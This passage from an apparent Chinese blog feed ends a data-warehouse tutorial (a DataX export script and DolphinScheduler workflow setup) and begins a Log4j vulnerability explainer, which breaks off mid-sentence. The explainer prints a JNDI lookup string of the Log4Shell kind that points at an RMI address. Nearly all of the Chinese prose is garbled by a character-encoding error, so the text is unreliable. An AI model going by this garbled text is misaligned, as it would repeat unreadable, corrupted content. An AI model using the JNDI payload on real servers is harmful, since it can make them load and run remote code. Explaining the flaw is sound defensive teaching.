$i</p><p>fi</p><p>done</p><p>}</p><p>##æ•°æ®å¯¼å‡º</p><p>export_data() {</p><p>datax_config=$1</p><p>export_dir=$2</p><p>handle_export_path $export_dir</p><p>$DATAX_HOME/bin/datax.py -pâ€-Dexportdir=$export_dirâ€ $datax_config</p><p>}</p><p>case $1 in</p><p>â€œads_new_buyer_statsâ€)</p><p>export_data /opt/module/datax/job/export/gmall_report.ads_new_buyer_stats.json<br>/warehouse/gmall/ads/ads_new_buyer_stats</p><p>;;</p><p>â€œads_order_by_provinceâ€)</p><p>export_data /opt/module/datax/job/export/gmall_report.ads_order_by_province.json<br>/warehouse/gmall/ads/ads_order_by_province</p><p>;;</p><p>â€œads_page_pathâ€)</p><p>export_data /opt/module/datax/job/export/gmall_report.ads_page_path.json<br>/warehouse/gmall/ads/ads_page_path</p><p>;;</p><p>â€œads_repeat_purchase_by_tmâ€)</p><p>export_data<br>/opt/module/datax/job/export/gmall_report.ads_repeat_purchase_by_tm.json<br>/warehouse/gmall/ads/ads_repeat_purchase_by_tm</p><p>;;</p><p>â€œads_trade_statsâ€)</p><p>export_data /opt/module/datax/job/export/gmall_report.ads_trade_stats.json<br>/warehouse/gmall/ads/ads_trade_stats</p><p>;;</p><p>â€œads_trade_stats_by_cateâ€)</p><p>export_data<br>/opt/module/datax/job/export/gmall_report.ads_trade_stats_by_cate.json<br>/warehouse/gmall/ads/ads_trade_stats_by_cate</p><p>;;</p><p>â€œads_trade_stats_by_tmâ€)</p><p>export_data /opt/module/datax/job/export/gmall_report.ads_trade_stats_by_tm.json<br>/warehouse/gmall/ads/ads_trade_stats_by_tm</p><p>;;</p><p>â€œads_traffic_stats_by_channelâ€)</p><p>export_data<br>/opt/module/datax/job/export/gmall_report.ads_traffic_stats_by_channel.json<br>/warehouse/gmall/ads/ads_traffic_stats_by_channel</p><p>;;</p><p>â€œads_user_actionâ€)</p><p>export_data /opt/module/datax/job/export/gmall_report.ads_user_action.json<br>/warehouse/gmall/ads/ads_user_action</p><p>;;</p><p>â€œads_user_changeâ€)</p><p>export_data /opt/module/datax/job/export/gmall_report.ads_user_change.json<br>/warehouse/gmall/ads/ads_user_change</p><p>;;</p><p>â€œads_user_retentionâ€)</p><p>export_data /opt/module/datax/job/export/gmall_report.ads_user_retention.json<br>/warehouse/gmall/ads/ads_user_retention</p><p>;;</p><p>â€œads_user_statsâ€)</p><p>export_data /opt/module/datax/job/export/gmall_report.ads_user_stats.json<br>/warehouse/gmall/ads/ads_user_stats</p><p>;;</p><p>â€œads_activity_statsâ€)</p><p>export_data /opt/module/datax/job/export/gmall_report.ads_activity_stats.json<br>/warehouse/gmall/ads/ads_activity_stats</p><p>;;</p><p>â€œads_coupon_statsâ€)</p><p>export_data /opt/module/datax/job/export/gmall_report.ads_coupon_stats.json<br>/warehouse/gmall/ads/ads_coupon_stats</p><p>;;</p><p>â€œads_sku_cart_num_top3_by_cateâ€)</p><p>export_data<br>/opt/module/datax/job/export/gmall_report.ads_sku_cart_num_top3_by_cate.json<br>/warehouse/gmall/ads/ads_sku_cart_num_top3_by_cate</p><p>;;</p><p>â€œallâ€)</p><p>export_data /opt/module/datax/job/export/gmall_report.ads_new_buyer_stats.json<br>/warehouse/gmall/ads/ads_new_buyer_stats</p><p>export_data /opt/module/datax/job/export/gmall_report.ads_order_by_province.json<br>/warehouse/gmall/ads/ads_order_by_province</p><p>export_data /opt/module/datax/job/export/gmall_report.ads_page_path.json<br>/warehouse/gmall/ads/ads_page_path</p><p>export_data<br>/opt/module/datax/job/export/gmall_report.ads_repeat_purchase_by_tm.json<br>/warehouse/gmall/ads/ads_repeat_purchase_by_tm</p><p>export_data /opt/module/datax/job/export/gmall_report.ads_trade_stats.json<br>/warehouse/gmall/ads/ads_trade_stats</p><p>export_data<br>/opt/module/datax/job/export/gmall_report.ads_trade_stats_by_cate.json<br>/warehouse/gmall/ads/ads_trade_stats_by_cate</p><p>export_data /opt/module/datax/job/export/gmall_report.ads_trade_stats_by_tm.json<br>/warehouse/gmall/ads/ads_trade_stats_by_tm</p><p>export_data<br>/opt/module/datax/job/export/gmall_report.ads_traffic_stats_by_channel.json<br>/warehouse/gmall/ads/ads_traffic_stats_by_channel</p><p>export_data /opt/module/datax/job/export/gmall_report.ads_user_action.json<br>/warehouse/gmall/ads/ads_user_action</p><p>export_data /opt/module/datax/job/export/gmall_report.ads_user_change.json<br>/warehouse/gmall/ads/ads_user_change</p><p>export_data /opt/module/datax/job/export/gmall_report.ads_user_retention.json<br>/warehouse/gmall/ads/ads_user_retention</p><p>export_data /opt/module/datax/job/export/gmall_report.ads_user_stats.json<br>/warehouse/gmall/ads/ads_user_stats</p><p>export_data /opt/module/datax/job/export/gmall_report.ads_activity_stats.json<br>/warehouse/gmall/ads/ads_activity_stats</p><p>export_data /opt/module/datax/job/export/gmall_report.ads_coupon_stats.json<br>/warehouse/gmall/ads/ads_coupon_stats</p><p>export_data<br>/opt/module/datax/job/export/gmall_report.ads_sku_cart_num_top3_by_cate.json<br>/warehouse/gmall/ads/ads_sku_cart_num_top3_by_cate</p><p>;;</p><p>esac</p><p>ï¼ˆ3ï¼‰å¢åŠ è„šæœ¬æ‰§è¡Œæƒé™</p><p>[atguigu@hadoop102 bin]$ chmod +x hdfs_to_mysql.sh</p><p>ï¼ˆ4ï¼‰è„šæœ¬ç”¨æ³•</p><p>[atguigu@hadoop102 bin]$ hdfs_to_mysql.sh all</p><h2 id="ç¬¬13ç« -æ•°æ®ä»“åº“å·¥ä½œæµè°ƒåº¦"><a href="#ç¬¬13ç« -æ•°æ®ä»“åº“å·¥ä½œæµè°ƒåº¦" class="headerlink" title="ç¬¬13ç«  æ•°æ®ä»“åº“å·¥ä½œæµè°ƒåº¦"></a>ç¬¬13ç«  æ•°æ®ä»“åº“å·¥ä½œæµè°ƒåº¦</h2><h3 id="è°ƒåº¦å·¥å…·éƒ¨ç½²"><a href="#è°ƒåº¦å·¥å…·éƒ¨ç½²" class="headerlink" title="è°ƒåº¦å·¥å…·éƒ¨ç½²"></a>è°ƒåº¦å·¥å…·éƒ¨ç½²</h3><h3 id="æ–°æ•°æ®ç”Ÿæˆ"><a href="#æ–°æ•°æ®ç”Ÿæˆ" class="headerlink" title="æ–°æ•°æ®ç”Ÿæˆ"></a>æ–°æ•°æ®ç”Ÿæˆ</h3><h4 id="ç”¨æˆ·è¡Œä¸ºæ—¥å¿—"><a href="#ç”¨æˆ·è¡Œä¸ºæ—¥å¿—" class="headerlink" title="ç”¨æˆ·è¡Œä¸ºæ—¥å¿—"></a>ç”¨æˆ·è¡Œä¸ºæ—¥å¿—</h4><p><strong>1ï¼‰å¯åŠ¨æ—¥å¿—é‡‡é›†é€šé“ï¼ŒåŒ…æ‹¬Kafkaã€Flumeç­‰</strong></p><p><strong>ï¼ˆ1ï¼‰å¯åŠ¨Zookeeper</strong></p><p>[atguigu@hadoop102 ~]$ zk.sh start</p><p><strong>ï¼ˆ2ï¼‰å¯åŠ¨Kafka</strong></p><p>[atguigu@hadoop102 ~]$ kf.sh start</p><p><strong>ï¼ˆ3ï¼‰å¯åŠ¨Flume</strong></p><p>[atguigu@hadoop102 ~]$ f1.sh start</p><p>[atguigu@hadoop102 ~]$ f2.sh start</p><p><strong>2ï¼‰ä¿®æ”¹æ—¥å¿—æ¨¡æ‹Ÿå™¨é…ç½®æ–‡ä»¶</strong></p><p>ä¿®æ”¹hadoop102å’Œhadoop103ä¸¤å°èŠ‚ç‚¹ä¸­çš„/opt/module/applog/application.ymlæ–‡ä»¶ï¼Œä¿®æ”¹mock.dateå‚æ•°å¦‚ä¸‹</p><p>mock.date: â€œ2020-06-15â€</p><p><strong>3ï¼‰æ‰§è¡Œæ—¥å¿—ç”Ÿæˆè„šæœ¬</strong></p><p>[atguigu@hadoop102 ~]$ lg.sh</p><p><strong>4ï¼‰è§‚å¯ŸHDFSä¸Šæ˜¯å¦æœ‰2020-06-15çš„æ—¥å¿—æ•°æ®ç”Ÿæˆ</strong></p><h4 id="ä¸šåŠ¡æ•°æ®"><a href="#ä¸šåŠ¡æ•°æ®" class="headerlink" title="ä¸šåŠ¡æ•°æ®"></a>ä¸šåŠ¡æ•°æ®</h4><p><strong>1ï¼‰ä¿®æ”¹Maxwellé…ç½®æ–‡ä»¶</strong></p><p><strong>ï¼ˆ1ï¼‰ä¿®æ”¹/opt/module/maxwell/config.propertiesæ–‡ä»¶</strong></p><p>[atguigu@hadoop102 maxwell]$ vim /opt/module/maxwell/config.properties</p><p><strong>ï¼ˆ2ï¼‰ä¿®æ”¹mock_dateå‚æ•°è®¾ç½®å¦‚ä¸‹</strong></p><p>mock_date=2020-06-15</p><p><strong>2ï¼‰å¯åŠ¨å¢é‡è¡¨é‡‡é›†é€šé“ï¼ŒåŒ…æ‹¬Maxwelã€Kafkaã€Flumeç­‰</strong></p><p><strong>ï¼ˆ1ï¼‰å¯åŠ¨Maxwell</strong></p><p>[atguigu@hadoop102 ~]$ mxw.sh start</p><p><strong>æ³¨ï¼šè‹¥Maxwellå½“å‰æ­£åœ¨è¿è¡Œï¼Œä¸ºç¡®ä¿ä¸Šè¿°mockå‚æ•°ç”Ÿæ•ˆï¼Œéœ€é‡å¯Maxwellã€‚</strong></p><p><strong>ï¼ˆ2ï¼‰å¯åŠ¨Flume</strong></p><p>[atguigu@hadoop102 ~]$ f3.sh start</p><p><strong>3ï¼‰ä¿®æ”¹ä¸šåŠ¡æ•°æ®æ¨¡æ‹Ÿå™¨é…ç½®æ–‡ä»¶ä¸­çš„mock_dateå‚æ•°</strong></p><p>mock.date=2020-06-15</p><p><strong>4ï¼‰æ‰§è¡Œä¸šåŠ¡æ•°æ®ç”Ÿæˆå‘½ä»¤</strong></p><p>[atguigu@hadoop102 db_log]$ java -jar gmall2020-mock-db-2021-10-10.jar</p><p><strong>5ï¼‰è§‚å¯ŸHDFSä¸Šå¢é‡è¡¨æ˜¯å¦æœ‰2020-06-15çš„æ•°æ®ç”Ÿæˆ</strong></p><h3 id="å·¥ä½œæµè°ƒåº¦å®æ“"><a href="#å·¥ä½œæµè°ƒåº¦å®æ“" class="headerlink" title="å·¥ä½œæµè°ƒåº¦å®æ“"></a>å·¥ä½œæµè°ƒåº¦å®æ“</h3><p>ç”±äºDolphinScheduleré›†ç¾¤æ¨¡å¼å¯åŠ¨è¿›ç¨‹è¾ƒå¤šï¼Œå¯¹è™šæ‹Ÿæœºå†…å­˜è¦æ±‚è¾ƒé«˜ã€‚æ•…ä¸‹é¢æä¾›ä¸¤ç§æ–¹å¼ï¼Œå¯æ ¹æ®è™šæ‹Ÿæœºå†…å­˜æƒ…å†µè¿›è¡Œé€‰æ‹©ã€‚</p><h4 id="DolphinScheduleré›†ç¾¤æ¨¡å¼"><a href="#DolphinScheduleré›†ç¾¤æ¨¡å¼" class="headerlink" title="DolphinScheduleré›†ç¾¤æ¨¡å¼"></a>DolphinScheduleré›†ç¾¤æ¨¡å¼</h4><p><strong>1ï¼‰å¯åŠ¨DolphinScheduler</strong></p><p>[atguigu@hadoop102 dolphinscheduler]$ bin/start-all.sh</p><p><strong>2ï¼‰ä½¿ç”¨æ™®é€šç”¨æˆ·ç™»å½•</strong></p><p><img src="https://snowgo.top/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/1481d8f1ba008676e566cbdc2500fd15.png" alt="å›¾å½¢ç”¨æˆ·ç•Œé¢, åº”ç”¨ç¨‹åºæè¿°å·²è‡ªåŠ¨ç”Ÿæˆ"></p><p><strong>3ï¼‰å‘DolphinSchedulerèµ„æºä¸­å¿ƒä¸Šä¼ å·¥ä½œæµæ‰€éœ€è„šæœ¬</strong></p><p><strong>ï¼ˆ1ï¼‰åˆ›å»ºæ–‡ä»¶å¤¹</strong></p><p><img src="https://snowgo.top/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/a60dc4b0a470a68579f0bda2ccd3a72a.png" alt="å›¾å½¢ç”¨æˆ·ç•Œé¢, åº”ç”¨ç¨‹åºæè¿°å·²è‡ªåŠ¨ç”Ÿæˆ"></p><p><strong>ï¼ˆ2ï¼‰ä¸Šä¼ å·¥ä½œæµæ‰€éœ€è„šæœ¬</strong></p><p>å°†å·¥ä½œæµæ‰€éœ€çš„æ‰€æœ‰è„šæœ¬ä¸Šä¼ åˆ°èµ„æºä¸­å¿ƒscriptsè·¯å¾„ä¸‹ï¼Œç»“æœå¦‚ä¸‹</p><p><img src="https://snowgo.top/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/e6a8173a7ca62fe509ba8b7fe07bc45e.png" alt="å›¾å½¢ç”¨æˆ·ç•Œé¢, åº”ç”¨ç¨‹åºæè¿°å·²è‡ªåŠ¨ç”Ÿæˆ"></p><p><strong>4ï¼‰å‘DolphinSchedulerçš„WorkerServerèŠ‚ç‚¹åˆ†å‘è„šæœ¬ä¾èµ–çš„ç»„ä»¶</strong></p><p>ç”±äºå·¥ä½œæµè¦æ‰§è¡Œçš„è„šæœ¬éœ€è¦è°ƒç”¨Hiveã€DataXç­‰ç»„ä»¶ï¼Œæ•…åœ¨DolphinSchedulerçš„é›†ç¾¤æ¨¡å¼ä¸‹ï¼Œéœ€è¦ç¡®ä¿æ¯ä¸ªWorkerServerèŠ‚ç‚¹éƒ½æœ‰è„šæœ¬æ‰€ä¾èµ–çš„ç»„ä»¶ã€‚</p><p>[atguigu@hadoop102 ~]$ xsync /opt/module/hive/</p><p>[atguigu@hadoop102 ~]$ xsync /opt/module/spark/</p><p>[atguigu@hadoop102 ~]$ xsync /opt/module/datax/</p><p><strong>5ï¼‰ä¿®æ”¹DolphinSchedulerç¯å¢ƒå˜é‡é…ç½®æ–‡ä»¶å¹¶åˆ†å‘</strong></p><p><strong>ï¼ˆ1ï¼‰ä¿®æ”¹/opt/module/dolphinscheduler/conf/env/dolphinscheduler_env.shæ–‡ä»¶</strong></p><p>[atguigu@hadoop102 ~]$ vim<br>/opt/module/dolphinscheduler/conf/env/dolphinscheduler_env.sh</p><p><strong>ï¼ˆ2ï¼‰ä¿®æ”¹å†…å®¹å¦‚ä¸‹</strong></p><p><strong>export HADOOP_HOME=/opt/module/hadoop-3.1.3</strong></p><p><strong>export HADOOP_CONF_DIR=/opt/module/hadoop-3.1.3/etc/hadoop</strong></p><p><strong>export SPARK_HOME=/opt/module/spark</strong></p><p>export SPARK_HOME2=/opt/soft/spark2</p><p>export PYTHON_HOME=/opt/soft/python</p><p><strong>export JAVA_HOME=/opt/module/jdk1.8.0_212</strong></p><p><strong>export HIVE_HOME=/opt/module/hive</strong></p><p>export FLINK_HOME=/opt/soft/flink</p><p><strong>export DATAX_HOME=/opt/module/datax</strong></p><p>export<br>PATH=$HADOOP_HOME/bin:$SPARK_HOME1/bin:$SPARK_HOME2/bin:$PYTHON_HOME:$JAVA_HOME/bin:$HIVE_HOME/bin:$FLINK_HOME/bin:$DATAX_HOME/bin:$PATH</p><p><strong>ï¼ˆ3ï¼‰åˆ†å‘æ–‡ä»¶</strong></p><p>[atguigu@hadoop102 ~]$ xsync<br>/opt/module/dolphinscheduler/conf/env/dolphinscheduler_env.sh</p><p><strong>6ï¼‰åˆ›å»ºå·¥ä½œæµ</strong></p><p><strong>ï¼ˆ1ï¼‰åœ¨gmallé¡¹ç›®ä¸‹åˆ›å»ºå·¥ä½œæµ</strong></p><p><img src="https://snowgo.top/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/d9fc3d70a9ffeb2779c9ddf2606ec9c6.png" alt="å›¾å½¢ç”¨æˆ·ç•Œé¢, æ–‡æœ¬, åº”ç”¨ç¨‹åº, ç”µå­é‚®ä»¶æè¿°å·²è‡ªåŠ¨ç”Ÿæˆ"></p><p><strong>ï¼ˆ2ï¼‰å„ä»»åŠ¡èŠ‚ç‚¹é…ç½®å¦‚ä¸‹</strong></p><p>mysql_to_hdfs_full</p><p><img src="https://snowgo.top/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/69e0cb43ad0c3fb4a489714786c83698.png" alt="å›¾å½¢ç”¨æˆ·ç•Œé¢ æè¿°å·²è‡ªåŠ¨ç”Ÿæˆ"></p><p>hdfs_to_ods_db</p><p><img src="https://snowgo.top/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/83911dcf800a2eb193f3065fbf1b9b34.png" alt="å›¾å½¢ç”¨æˆ·ç•Œé¢, ç½‘ç«™ æè¿°å·²è‡ªåŠ¨ç”Ÿæˆ"></p><p>hdfs_to_ods_log</p><p><img src="https://snowgo.top/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/8bb4060781485c522894d2ebc62f1635.png" alt="å›¾å½¢ç”¨æˆ·ç•Œé¢ æè¿°å·²è‡ªåŠ¨ç”Ÿæˆ"></p><p>ods_to_dwd</p><p><img src="https://snowgo.top/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/b4e4a357d08b7bab51f62e65ff38be78.png" alt="å›¾å½¢ç”¨æˆ·ç•Œé¢, åº”ç”¨ç¨‹åºæè¿°å·²è‡ªåŠ¨ç”Ÿæˆ"></p><p>ods_to_dim</p><p><img src="https://snowgo.top/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/cf3545948699c57f70046ea24e7624fb.png"></p><p>dwd_to_dws_1d</p><p><img src="https://snowgo.top/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/7b73a75923f13e3f26143924e2d2c855.png" alt="å›¾å½¢ç”¨æˆ·ç•Œé¢, åº”ç”¨ç¨‹åºæè¿°å·²è‡ªåŠ¨ç”Ÿæˆ"></p><p>dws_1d_to_dws_nd</p><p><img src="https://snowgo.top/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/3a75dd2406a506dce545ffd66d2edbf6.png" alt="å›¾å½¢ç”¨æˆ·ç•Œé¢ æè¿°å·²è‡ªåŠ¨ç”Ÿæˆ"></p><p>dws_1d_to_dws_td</p><p><img src="https://snowgo.top/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/f55099f34de24da6434f1b64abc7284d.png" alt="å›¾å½¢ç”¨æˆ·ç•Œé¢ æè¿°å·²è‡ªåŠ¨ç”Ÿæˆ"></p><p>dws_to_ads</p><p><img src="https://snowgo.top/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/48e17699e7ca2b90fedbdff780114ef2.png" alt="å›¾å½¢ç”¨æˆ·ç•Œé¢ æè¿°å·²è‡ªåŠ¨ç”Ÿæˆ"></p><p>hdfs_to_mysql</p><p><img src="https://snowgo.top/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/b836f074cb3cd97aea4180eba5dacc43.png" alt="å›¾å½¢ç”¨æˆ·ç•Œé¢ æè¿°å·²è‡ªåŠ¨ç”Ÿæˆ"></p><p><strong>ï¼ˆ3ï¼‰å„èŠ‚ç‚¹ä¾èµ–å…³ç³»å¦‚ä¸‹</strong></p><p><img src="https://snowgo.top/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/939d849431ec54a97b617843bcd93c95.png" alt="å›¾ç‰‡åŒ…å« å›¾å½¢ç”¨æˆ·ç•Œé¢æè¿°å·²è‡ªåŠ¨ç”Ÿæˆ"></p><p><strong>ï¼ˆ4ï¼‰ä¿å­˜å·¥ä½œæµ</strong></p><p><img src="https://snowgo.top/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/af6fdf3719f3d409433799762e1b7303.png" alt="å›¾å½¢ç”¨æˆ·ç•Œé¢, åº”ç”¨ç¨‹åºæè¿°å·²è‡ªåŠ¨ç”Ÿæˆ"></p><p><strong>æ³¨ï¼šå®šæ—¶è°ƒåº¦æ—¶ï¼Œå…¨å±€å‚æ•°å€¼åº”è®¾ç½®ä¸º$[yyyy-MM-dd-1]æˆ–è€…ç©ºå€¼ã€‚</strong></p><p><strong>7ï¼‰ä¸Šçº¿å·¥ä½œæµ</strong></p><p><img src="https://snowgo.top/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/a9955ba5c3df2b063d8887cc3e7533e7.png" alt="å›¾å½¢ç”¨æˆ·ç•Œé¢, æ–‡æœ¬, åº”ç”¨ç¨‹åº, ç”µå­é‚®ä»¶æè¿°å·²è‡ªåŠ¨ç”Ÿæˆ"></p><p><strong>8ï¼‰æ‰§è¡Œå·¥ä½œæµ</strong></p><p><img src="https://snowgo.top/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/676ee75ef892f2de4bebaa09a8f68562.png" alt="å›¾å½¢ç”¨æˆ·ç•Œé¢, æ–‡æœ¬, åº”ç”¨ç¨‹åº, ç”µå­é‚®ä»¶æè¿°å·²è‡ªåŠ¨ç”Ÿæˆ"></p><h4 id="DolphinSchedulerå•æœºæ¨¡å¼"><a href="#DolphinSchedulerå•æœºæ¨¡å¼" class="headerlink" title="DolphinSchedulerå•æœºæ¨¡å¼"></a>DolphinSchedulerå•æœºæ¨¡å¼</h4><p><strong>1ï¼‰å¯åŠ¨DolphinScheduler</strong></p><p>[atguigu@hadoop102 dolphinscheduler]$ bin/dolphinscheduler-daemon.sh start<br>standalone-server</p><p><strong>2ï¼‰å®‰å…¨ä¸­å¿ƒé…ç½®</strong></p><p>ç”±äºDolphinSchedulerçš„å•æœºæ¨¡å¼ä½¿ç”¨çš„æ˜¯å†…ç½®çš„ZKå’Œæ•°æ®åº“ï¼Œæ•…åœ¨é›†ç¾¤æ¨¡å¼ä¸‹æ‰€åšçš„ç›¸å…³é…ç½®åœ¨å•æœºæ¨¡å¼ä¸‹å¹¶ä¸å¯è§ï¼Œæ‰€ä»¥éœ€è¦é‡æ–°é…ç½®ï¼Œå¿…è¦çš„é…ç½®ä¸ºåˆ›å»ºç§Ÿæˆ·å’Œåˆ›å»ºç”¨æˆ·ã€‚</p><p><strong>ï¼ˆ1ï¼‰ä½¿ç”¨ç®¡ç†å‘˜ç”¨æˆ·ç™»å½•</strong></p><p><img src="https://snowgo.top/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/1481d8f1ba008676e566cbdc2500fd15.png" alt="å›¾å½¢ç”¨æˆ·ç•Œé¢, åº”ç”¨ç¨‹åºæè¿°å·²è‡ªåŠ¨ç”Ÿæˆ"></p><p><strong>ï¼ˆ2ï¼‰åˆ›å»ºç§Ÿæˆ·</strong></p><p><img src="https://snowgo.top/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/0a674653cabbac1345075a5875dd95f7.png" alt="å›¾å½¢ç”¨æˆ·ç•Œé¢ æè¿°å·²è‡ªåŠ¨ç”Ÿæˆ"></p><p><strong>ï¼ˆ3ï¼‰åˆ›å»ºç”¨æˆ·</strong></p><p><img src="https://snowgo.top/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/bda9944d222b47200b691e3cf2657388.png" alt="æ‰‹æœºå±å¹•æˆªå›¾ æè¿°å·²è‡ªåŠ¨ç”Ÿæˆ"></p><p><strong>3ï¼‰åˆ‡æ¢æ™®é€šç”¨æˆ·ç™»å½•</strong></p><p><img src="https://snowgo.top/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/1481d8f1ba008676e566cbdc2500fd15.png" alt="å›¾å½¢ç”¨æˆ·ç•Œé¢, åº”ç”¨ç¨‹åºæè¿°å·²è‡ªåŠ¨ç”Ÿæˆ"></p><p><strong>4ï¼‰åˆ›å»ºé¡¹ç›®</strong></p><p><img src="https://snowgo.top/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/ab622546c77763b07184f0dcbf1afc28.png" alt="å›¾å½¢ç”¨æˆ·ç•Œé¢, ç½‘ç«™ æè¿°å·²è‡ªåŠ¨ç”Ÿæˆ"></p><p><strong>5ï¼‰å…¶ä½™æ“ä½œ</strong></p><p>å…¶ä½™æ“ä½œä¸é›†ç¾¤æ¨¡å¼åŸºæœ¬ä¸€è‡´ï¼Œå…¶ä¸­åˆ†å‘Hiveã€Sparkã€DataXè¿™ä¸€æ­¥å¯ä»¥çœç•¥ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> é¡¹ç›® </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ•°æ®ä»“åº“ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Log4jæ¼æ´è§£æ</title>
      <link href="/2021/12/21/Log4j%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90/"/>
      <url>/2021/12/21/Log4j%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p>ç›¸ä¿¡å¤§å®¶éƒ½çŸ¥é“è¿™ä¸¤å¤© log4j ä¸€ä¸ªè¶…å¤§æ¼æ´é—¹å¾—å…¨ç½‘éƒ½æ²¸æ²¸æ‰¬æ‰¬ï¼Œå¤§å¤šæ•°è·Ÿ Java æœ‰å…³çš„æœåŠ¡ç›®å‰åŸºæœ¬éƒ½å¤„äºç»´æŠ¤çŠ¶æ€ã€‚ä½†ç›®å‰çš„åª’ä½“åªæ˜¯åœ¨æè¿°å®ƒçš„å±å®³æ€§ï¼Œå¹¶æ²¡æœ‰æ·±å…¥æ¢è®¨ã€‚æ‰€ä»¥ä»Šå¤©æˆ‘æ¥ç»™å¤§å®¶ä½œä¸€ä¸ªè¾ƒå…¨é¢çš„ä»‹ç»ã€‚<br>â€‹</p><h2 id="ä»€ä¹ˆæ˜¯-log4j-ï¼Ÿï¼ˆèµ„æ·±-Java-ç©å®¶è¯·è·³è¿‡ï¼‰"><a href="#ä»€ä¹ˆæ˜¯-log4j-ï¼Ÿï¼ˆèµ„æ·±-Java-ç©å®¶è¯·è·³è¿‡ï¼‰" class="headerlink" title="ä»€ä¹ˆæ˜¯ log4j ï¼Ÿï¼ˆèµ„æ·± Java ç©å®¶è¯·è·³è¿‡ï¼‰"></a>ä»€ä¹ˆæ˜¯ log4j ï¼Ÿï¼ˆèµ„æ·± Java ç©å®¶è¯·è·³è¿‡ï¼‰</h2><p>â€‹</p><p>Â  Â  Â log4j æ˜¯ Java çš„ä¸€æ¬¾ä¼˜ç§€æ—¥å¿—æ¡†æ¶ï¼Œç›®å‰æ˜¯ Java è¡Œä¸šå†…äº§å“çš„æ ‡é…ï¼Œå‡ ä¹æ¯ä¸ª Java æœåŠ¡éƒ½ä½¿ç”¨äº† log4jã€‚ç®€å•æ¥è¯´å°±æ˜¯æ‰“å°å’Œå­˜å‚¨æœåŠ¡å™¨è¿è¡Œæ—¶äº§ç”Ÿçš„æŠ¥å‘Šå’ŒæŠ¥é”™ç­‰ã€‚<br>â€‹</p><h2 id="å“ªé‡Œæ¥çš„æ¼æ´ï¼Ÿ"><a href="#å“ªé‡Œæ¥çš„æ¼æ´ï¼Ÿ" class="headerlink" title="å“ªé‡Œæ¥çš„æ¼æ´ï¼Ÿ"></a>å“ªé‡Œæ¥çš„æ¼æ´ï¼Ÿ</h2><p>â€‹</p><p>Â  Â  Â log4j å†…æä¾›äº†ä¸€äº›å ä½ç¬¦æ›¿æ¢æœºåˆ¶ï¼Œå¦‚ä»¥ä¸‹ä»£ç :</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">logger.info(<span class="string">&quot;os: $&#123;java:os&#125;&quot;</span>);</span><br></pre></td></tr></table></figure><p>Â  Â  Â è¾“å‡ºçš„ç»“æœæ˜¯ â€œos: Windows 10â€ (å…·ä½“è¾“å‡ºä¼šæ›´å¤æ‚ï¼Œåœ¨è¿™é‡Œç®€ç•¥äº†) è€Œä¸æ˜¯ â€œos: ${java:os}â€ã€‚ä¹Ÿå°±æ˜¯æŠŠ ${java:os} æ›¿æ¢æˆäº† System.getProperties(â€œosâ€) ä¹Ÿå°±æ˜¯ â€œWindows 10â€ã€‚è¿™ä¸ªå¾ˆå¥½ç†è§£ï¼Œä½†ç¦»è°±çš„æ˜¯ log4j è¿˜æä¾›äº†å…³äº jndi çš„å ä½ç¬¦ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">logger.info(<span class="string">&quot;$&#123;jndi:rmi//127.0.0.1:1099/heike&#125;&quot;</span>) </span><br></pre></td></tr></table></figure><p>Â  Â  Â jndi æ˜¯ä»€ä¹ˆï¼Ÿè¯´ç®€å•çš„å°±æ˜¯å‡ ä¸ª Java ç¨‹åºäº’ç›¸äº¤æ¢ä¿¡æ¯çš„ä¸€ç§æŠ€æœ¯ï¼Œå› ä¸ºè¿™äº› Java ç¨‹åºéƒ½åœ¨åŒä¸€ä¸ª JVM è™šæ‹Ÿæœºä¸Šè¿è¡Œã€‚è€Œ jndi äº¤æ¢ä¿¡æ¯æœ‰å¾ˆå¤šç§æ ¼å¼ï¼Œä¸Šæ–‡ä»£ç ä¸­çš„ â€œrmiâ€ å°±æ˜¯å…¶ä¸­ä¹‹ä¸€ï¼Œä½ å¯ä»¥å°†å®ƒç†è§£ä¸º http åœ°å€ã€‚æ€»è€Œè¨€ä¹‹ï¼Œå°±æ˜¯å¯ä»¥ä½¿ä¸¤ä¸ª Java ç¨‹åºäº’ç›¸æå°åŠ¨ä½œçš„ä¸œè¥¿ã€‚<br>â€‹</p><p>Â  Â  Â è¨€å½’æ­£ä¼ ï¼Œå½“ä½ æ‰§è¡Œä¸Šæ–‡ä»£ç æ—¶ï¼Œlog4jä¼šè‡ªåŠ¨åŠ è½½é€šè¿‡Â jndiÂ 